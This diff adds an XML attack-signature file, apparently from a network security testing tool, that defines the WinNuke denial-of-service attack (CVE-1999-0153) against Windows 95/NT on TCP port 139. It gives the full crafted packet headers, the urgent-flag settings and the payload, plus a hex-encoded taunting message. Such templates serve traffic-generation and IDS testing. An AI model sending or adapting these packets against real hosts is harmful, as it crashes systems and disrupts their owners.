@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="WinNuke"/>
+    <EngDesc display="true" value="This threat crashes Windows machines running Windows 95 and Windows NT 4.0 and prior. This threat sends a large payload to TCP port 139."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="NETBIOS_SS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Host"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Windows_95"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/bid/2010"/>
+    <CVEID display="true" value="CVE-1999-0153"/>
+    <bugtraqID display="true" value="2010"/>
+    <OSVDB display="true" value="1666"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="000001001ed9a19b00c000a80001003c66468b09"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633607571827187500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X57\X69\X6e\X4e\X75\X6b\X65\X20\X69\X73\X20\X61\X6e\X20\X6f\X6c\X64\X20\X74\X68\X72\X65\X61\X74\X2e\X20\X4e\X6f\X20\X6f\X6e\X65\X20\X69\X73\X20\X72\X75\X6e\X6e\X69\X6e\X67\X20\X57\X69\X6e\X64\X6f\X77\X73\X20\X39\X35\X2e\X20\X49\X66\X20\X74\X68\X65\X79\X20\X61\X72\X65\X20\X74\X68\X65\X6e\X20\X74\X68\X65\X79\X20\X68\X61\X76\X65\X20\X61\X20\X6c\X6f\X74\X20\X6d\X6f\X72\X65\X20\X70\X72\X6f\X62\X6c\X65\X6d\X73\X20\X62\X65\X73\X69\X64\X65\X73\X20\X57\X69\X6e\X4e\X75\X6b\X65\X2e\X20\X49\X6d\X70\X65\X72\X66\X65\X63\X74\X20\X4e\X65\X74\X77\X6f\X72\X6b\X73\X20\X6f\X77\X6e\X73\X20\X79\X6f\X75\X72\X20\X62\X6f\X78\X2e\X20"/>
+    <Created value="1225175667" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="I"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="J"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="K"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="L"/>
+    <NamedVar name="NETBIOS_SSdestPort" type="ImperfectControls.Port" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="J"/>
+      <for index="I"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="003A" Identification="DC5F" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="D8E5" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$NETBIOS_SSdestPort" SeqNumber="9B62E4F0" AckNumber="D3D96F19" HeaderLength="08" WindowSize="00B7" Checksum="" UrgentPointer="0006" Options="0101080A2AD038B235592C82" Payload="5375636B6572" CWR="false" ECE="false" URG="true" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
